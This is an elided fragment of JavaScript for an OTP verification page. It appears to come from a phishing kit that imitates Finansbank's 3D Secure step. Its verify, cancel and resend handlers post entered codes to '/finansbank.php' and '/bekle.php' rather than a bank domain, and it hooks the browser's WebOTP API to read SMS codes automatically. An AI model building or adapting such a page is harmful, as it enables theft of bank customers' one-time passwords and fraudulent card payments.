...
Core = function() {
    var l = 180,
        i = {},
        n, t;
    i.VerifyUri = "/finansbank.php";
    i.CancelUri = "/bekle.php";
    i.ResendUri = "/finansbank.php";
    n = {};
    n.AuthId = $("#authId");
    n.OTP = $("#otp");
    n.Loader = $("#loaderDiv");
    n.CallbackForm = $("#callbackForm");
    n.GOCallbackForm = $("#goCallbackForm");
    n.WrongPassDiv = $("#wrongPassDiv");
    n.OTPRefNoSpan = $("#otpRefNo");
    n.SubmitButtonDiv = $("#submitButtonDiv");
    n.TimeOutDiv = $("#timeOutDiv");
    n.Counter = $("#has-counter");
    n.HelpArea = $("#helpArea");
    t = {};
    t.OK = 1;
    t.ERROR = 2;
    t.CALLBACK = 3;
    var w = '<div class="content-wrapper"><div class="error-messages"><span class="status" style="display: block;">{{Message}}<\/span><\/div><\/div>',
        a = null,
        o = !1,
        f = l,
        b = function() {
            n.SubmitButtonDiv.hide();
            n.WrongPassDiv.hide();
            n.TimeOutDiv.show();
            n.OTP.hide();
            clearInterval(a)
        ...
        c = function(t) {
            n.WrongPassDiv.children("span.has-reg").text(t);
            n.WrongPassDiv.show()
        };
    return {
        Verify: function() {
            ...
            s(i.VerifyUri, {
                ...
                n.Status === t.OK && n.SubmitForm != null ? e(n.SubmitForm) : n.Status === t.ERROR ? c(n.Message) : n.Status === t.CALLBACK && n.SubmitForm != null ? e(n.SubmitForm) : r();
                u()
            }, function() {
                r();
                u()
        ...
        Cancel: function() {
            ...
            s(i.CancelUri, {
                ...
                n.Status === t.OK && n.SubmitForm != null ? e(n.SubmitForm) : n.Status === t.ERROR ? p(n.Message) : r();
                u()
            }, function() {
                r();
                u()
        ...
        Resend: function() {
            ...
            s(i.ResendUri, {
                ...
                i.Status === t.OK ? (c(i.Message), n.SubmitButtonDiv.show(), n.TimeOutDiv.hide(), n.OTPRefNoSpan.text(i.NewOTPRef), y()) : i.Status === t.ERROR ? p(i.Message) : i.Status === t.CALLBACK && i.SubmitForm != null ? e(i.SubmitForm) : r();
                u()
            }, function() {
                r();
                u()
        ...
        ShowHelpText: function() {
            n.HelpArea.toggle();
            n.HelpArea.is(":visible") && $("html, body").animate({
                scrollTop: n.HelpArea.offset().top
            }, "slow")
        },
        Start: function() {
            y()
...
"OTPCredential" in window && window.addEventListener("DOMContentLoaded", () => {
    var t = document.getElementById("otp"),
        i = document.getElementById("submitbutton"),
